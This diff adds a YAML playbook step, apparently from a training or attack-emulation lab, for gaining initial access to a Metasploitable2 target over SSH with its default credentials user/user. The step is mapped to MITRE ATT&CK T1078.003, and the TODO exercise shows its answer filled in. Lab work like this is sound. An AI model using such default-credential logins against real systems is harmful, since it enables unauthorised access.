@@ -1,0 +1,35 @@
+# Phase 4: Initial Access - SSH with Weak Credentials
+#
+# Background: Metasploitable2 ships with the account user/user enabled.
+# This is a valid accounts abuse rather than an exploit - no CVE, no module.
+#
+# Result:     Interactive SSH session as low-privilege user (privilege escalation required)
+# Variables required: $TARGET
+# Variables set:      $SESSION_NAME
+# ATT&CK: T1078.003 (Valid Accounts: Local Accounts)
+
+commands:
+  - type: debug
+    cmd: "Opening SSH session to $TARGET with known credentials..."
+
+  # TODO: Open an SSH session using the weak credentials.
+  # Fill in username and password. The session name is ssh_foothold.
+  # You can run 'id' as the first command so you immediately see which user you landed as.
+  - type: ssh
+    cmd: id
+    hostname: $TARGET
+    username: user
+    password: user
+    creates_session: ssh_foothold
+    metadata:
+      tactic: "TA0001"
+      technique: "T1078.003"
+      technique_name: "Valid Accounts: Local Accounts"
+
+  # Store the session name for subsequent includes
+  - type: setvar
+    variable: SESSION_NAME
+    cmd: ssh_foothold
+
+  - type: debug
+    cmd: "SSH foothold established as: $RESULT_STDOUT. Privilege escalation required."
